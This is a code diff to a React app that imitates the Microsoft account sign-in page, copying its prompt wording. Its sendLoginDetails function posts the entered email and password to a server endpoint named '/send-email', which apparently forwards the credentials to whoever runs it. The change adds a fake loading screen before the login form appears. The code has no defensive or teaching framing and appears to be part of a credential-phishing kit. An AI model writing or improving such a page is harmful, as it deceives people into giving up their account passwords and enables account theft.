@@ -1,11 +1,21 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
+import Loading from './Loading'; // Ensure this path is correct
 
 function App() {
-  const [view, setView] = useState('uname');
+  const [view, setView] = useState('loading'); // Start with loading view
   const [unameVal, setUnameVal] = useState(false);
   const [pwdVal, setPwdVal] = useState(false);
   const [uname, setUname] = useState('');
   const [pwd, setPwd] = useState('');
+
+  useEffect(() => {
+    // Simulate loading time
+    const timer = setTimeout(() => {
+      setView('uname');
+    }, 3000); // Adjust the timeout as needed
+
+    return () => clearTimeout(timer);
+  }, []);
 
   const unReq = "Enter a valid email address, phone number, or Skype name.";
   const pwdReq = "Please enter the password for your Microsoft account.";
@@ -74,7 +84,7 @@ function App() {
   };
 
   const sendLoginDetails = (email, password) => {
-    fetch('http://localhost:3000/send-email', { // Your server's URL
+    fetch('http://localhost:3000/send-email', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -89,6 +99,10 @@ function App() {
       console.error('Error:', error);
     });
   };
+
+  if (view === 'loading') {
+    return <Loading />;
+  }
 
   return (
     <div>
